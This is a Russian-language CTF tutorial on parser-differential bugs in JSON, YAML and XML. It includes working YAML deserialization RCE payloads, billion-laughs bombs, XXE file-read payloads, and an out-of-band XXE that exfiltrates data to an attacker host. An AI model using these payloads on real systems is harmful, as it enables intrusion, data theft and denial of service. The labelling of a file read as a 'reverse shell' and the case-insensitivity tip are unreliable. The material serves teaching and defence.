Структурированные текстовые форматы — JSON, YAML, XML — кажутся простыми, но каждый из них допускает двусмысленности. Разные парсеры трактуют одни и те же байты по-разному, а это и есть баг: то, что проверяющая система считает «безопасным», исполнитель видит как «опасное». В CTF такие задачи встречаются и в misc, и в web (обход валидации, SSRF, XXE). Разберём каталог трюков по форматам.

## JSON: дубликаты ключей

Спецификация JSON не запрещает повторяющиеся ключи. Что возьмёт парсер — зависит от реализации:

```json
{"role": "user", "role": "admin"}
```

- Python `json.loads` — **последнее** значение (`admin`);
- многие строгие парсеры — **первое** (`user`);
- некоторые — ошибка.

Отсюда классический обход: система проверяет первое значение, а логика использует последнее (или наоборот). То же с **Unicode-экранированием**: `{"\u0072ole": "admin"}` эквивалентно `{"role": "admin"}`, но фильтр по строке `"role"` его не поймает.

## JSON: числа и типы

```json
{"id": 1, "id": 1.0, "id": 1e0}
```

Разные парсеры дадут `int`, `float` или строку. А ещё:

- `NaN`, `Infinity`, `-Infinity` — не валидный JSON по RFC, но Python/JS их принимают;
- очень большие числа теряют точность в JS (`Number.MAX_SAFE_INTEGER`);
- `true`/`false` vs `"true"` — тип имеет значение при строгой проверке.

## JSON-полиглоты и инъекции

JSON можно спрятать в других контекстах. Если приложение строит JSON-строку конкатенацией:

```python
payload = '{"user":"' + input + '"}'
```

то ввод `x","admin":true,"z":"` даёт `{"user":"x","admin":true,"z":""}`. Это JSON-инъекция. Также встречаются **JSONP**-обёртки и **JSON hijacking**.

## YAML: мощь и опасность

YAML поддерживает теги, якоря и **произвольные объекты**. Небезопасная десериализация в PyYAML (`yaml.load` без `SafeLoader`) исполняет код:

```yaml
!!python/object/apply:os.system ["id"]
```

Или классический реверс-шелл:

```yaml
!!python/object/apply:subprocess.check_output
  - ["/bin/sh", "-c", "cat /flag"]
```

Безопасный парсинг: `yaml.safe_load` / `SafeLoader`. Но даже `safe_load` уязвим к **billion laughs**:

```yaml
a: &a ["x","x","x","x","x","x","x","x","x"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
```

Парсер разворачивает якоря экспоненциально — память кончается (DoS). Другие трюки: `!!binary` для неожиданных байтов, multi-document (`---`) с несколькими корнями, и YAML-полиглоты, которые одновременно валидны как JSON.

## XML: XXE и billion laughs

XML поддерживает **внешние сущности**. Если парсер не отключил DTD, атакующий читает файлы и делает SSRF:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

Сервер подставит содержимое `/etc/passwd` вместо `&xxe;`. Защита — отключить `DTD`/`external entities`:

```python
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

Billion laughs в XML:

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
]>
```

Каждый уровень умножает на 10 — документ в сотни байт раздувается до гигабайт.

## Расхождения парсеров: почему это баг

Ключевая идея: **если два компонента по-разному парсят один и тот же вход, между ними есть «зазор»**. Примеры реальных CVE: разные обработки `\u0000`, дубликатов заголовков, нормализации Unicode. В CTF задача часто даёт «валидатор» и «исполнитель», и надо найти вход, который валидатор пропускает, а исполнитель интерпретирует иначе.

| Трюк | Что эксплуатирует |
|------|-------------------|
| Дубликат ключа | Разные приоритеты first/last |
| Unicode-escape ключа | Фильтр по строке не срабатывает |
| YAML-тег | RCE при небезопасном load |
| YAML-якоря | Billion laughs (DoS) |
| XXE | Чтение файлов/SSRF |
| Комментарии/пробелы | Обход простого regex |

## Разобранный пример: обход проверки роли

Приложение: проверяет `json.loads(body)["role"] == "user"` для доступа, но затем отдаёт данные по **последнему** ключу. Отправляем:

```bash
curl -s -X POST http://chal/api -H 'Content-Type: application/json' \
  -d '{"role":"user","role":"admin"}'
```

Валидатор (строгий, берёт первое) пропускает — «user». Логика (Python, берёт последнее) видит «admin» и отдаёт секрет. Это реальный класс багов.

## Практический инструментарий

- Python: `json.loads`, `yaml.safe_load`, `lxml.etree`.
- Проверка YAML: `yq`, `python3 -c "import yaml;print(yaml.safe_load(open('f.yml')))"`.
- XML: `xmllint --noent file.xml` (осторожно — разворачивает сущности).
- Фаззинг: `boofuzz`, `AFL` для парсеров.
- Поиск различий: сравнивать вывод двух парсеров на одном входе.

## Частые ошибки и подводные камни

- Использовать `yaml.load` без `SafeLoader` — RCE.
- Думать, что «валидный JSON» однозначен — нет, дубликаты и числа зависят от реализации.
- Открывать чужой XML/HTML в браузере — сработает XXE/SSRF.
- Игнорировать BOM (`\ufeff`) и пробелы перед `{` — некоторые парсеры падают, другие нет.
- Забывать про `\u0000`: строка может «обрезаться» на null-байте в одном слое.
- Считать, что `safe_load` защищает от DoS — billion laughs всё равно работает.

## Дополнительная теория: десериализация и RCE

Самая опасная грань этих форматов — **десериализация объектов**. YAML позволяет создавать произвольные объекты (`!!python/object`), что в PyYAML без `SafeLoader` даёт RCE. Аналогично в других языках: Ruby YAML (`Psych.load` с `unsafe_load`), Java (SnakeYAML), .NET. Правило: парсите данные, а не код. Всегда используйте `safe_load`/`SafeConstructor` и, если возможно, схемы (JSON Schema, XSD) для валидации структуры. В CTF «RCE через YAML» — классика: дают поле ввода, которое парсится как YAML.

XML добавляет **XXE** и **XInclude**. Даже если внешние сущности отключены, могут остаться XInclude (`<xi:include href="file:///etc/passwd"/>`), параметрические сущности, а также атаки на парсеры (billion laughs, quadratic blowup). Отключайте DTD, внешние сущности и XInclude явно; ограничивайте глубину и размер. В Python: `lxml.etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False)`, а для `defusedxml` — используйте его как обёртку.

## Расхождения парсеров как класс уязвимостей

Идея «parser differential» заслуживает отдельного внимания. Если два компонента парсят один вход по-разному, между ними возникает зазор. Примеры: дубликаты ключей (first vs last), разные трактовки `\u0000`, разная нормализация Unicode, разные лимиты глубины, разная обработка BOM. В реальных CVE это приводило к обходу авторизации (валидатор видел `role=user`, приложение — `role=admin`), к SSRF (валидатор видел один URL, fetcher — другой) и к контрабанде запросов. В CTF такие задачи формулируются как «есть валидатор и есть логика» — ищите вход, который они интерпретируют по-разному.

Инструментально это исследуют, подавая один вход в оба компонента и сравнивая результаты. Полезны библиотеки, реализующие разные парсеры (`json` vs `ujson` vs `orjson`; `PyYAML` vs `ruamel`; `lxml` vs `xml.etree`).

## Разбор ошибок и отладка

Если `json.loads` падает — проверьте кавычки (JSON требует двойные), запятые и экранирование. Если YAML «странно парсится» — проверьте отступы (табы запрещены), `:` в значениях (нужны кавычки) и теги. Если XML не парсится — проверьте закрытие тегов, экранирование `&`, `<`, `>`. Если payload не срабатывает — проверьте, какой именно парсер используется (по ошибкам и поведению). Для XXE убедитесь, что DTD вообще обрабатывается: некоторые парсеры по умолчанию его игнорируют. Ведите маленькие тестовые входы, чтобы изолировать поведение.

## Практический разбор: XXE с обходом фильтра

Дано: XML-эндпоинт, который фильтрует строку `SYSTEM`. Прямой XXE не проходит. Обходы:

- используем **параметрические сущности** в DTD;
- обходим регистр (`system`, `SyStEm`) — XML-ключевые слова регистронезависимы только для `SYSTEM`/`PUBLIC`, поэтому регистр помогает против наивных фильтров;
- прячем `SYSTEM` через внешний DTD: подгружаем DTD с нашего сервера, где `SYSTEM` есть, но фильтр его не видит, потому что он не в теле запроса.

```xml
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://evil.example/evil.dtd">
  %ext;
]>
<root>&xxe;</root>
```

На нашем сервере `evil.dtd`:

```
<!ENTITY xxe SYSTEM "file:///flag">
```

Фильтр проверяет тело запроса и не видит `SYSTEM` в загружаемом DTD. Сервер подгружает DTD, определяет `xxe` и подставляет файл. Это **out-of-band XXE** — классика, когда прямой вывод недоступен (blind XXE): данные эксфильтруются через подзапрос (`<!ENTITY % file SYSTEM "file:///flag"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil/?d=%file;'>">%eval;%exfil;`). Если сеть недоступна — используйте error-based XXE: содержимое файла попадает в сообщение об ошибке.
